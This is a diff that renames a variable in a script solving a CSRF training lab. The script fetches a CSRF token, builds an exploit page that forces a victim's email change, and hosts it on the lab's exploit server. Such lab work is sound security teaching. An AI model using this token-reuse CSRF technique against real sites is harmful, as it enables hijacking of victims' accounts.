@@ -3,13 +3,13 @@ import { ExploitServer } from "../../../utils/exploitServer.js";
 import { getParsedInput } from "../../../utils/getParsedInput.js";
 import { createExploit } from "../utils/createExploit.js";
 
-const { url, httpClient } = getParsedInput({
+const { labUrl, httpClient } = getParsedInput({
   description: "Lab: CSRF where token is not tied to user session",
   proxy: true,
 });
 
 const exploit = await getExploit();
-const exploitServer = await ExploitServer.create(url, httpClient);
+const exploitServer = await ExploitServer.create(labUrl, httpClient);
 await exploitServer.storeExploit(exploit);
 
 console.log(`To solve the lab:
@@ -18,13 +18,13 @@ console.log(`To solve the lab:
 
 async function getExploit() {
   const exploitFilePath = new URL("./exploit.html", import.meta.url);
-  const actionUrl = url + "my-account/change-email";
+  const actionUrl = labUrl + "my-account/change-email";
   const csrfToken = await getCsrfToken();
   return createExploit(exploitFilePath, { actionUrl, csrfToken });
 }
 
 async function getCsrfToken() {
-  const { data: html } = await httpClient.get(url + "login");
+  const { data: html } = await httpClient.get(labUrl + "login");
   return extractCsrfToken(html);
 }
 
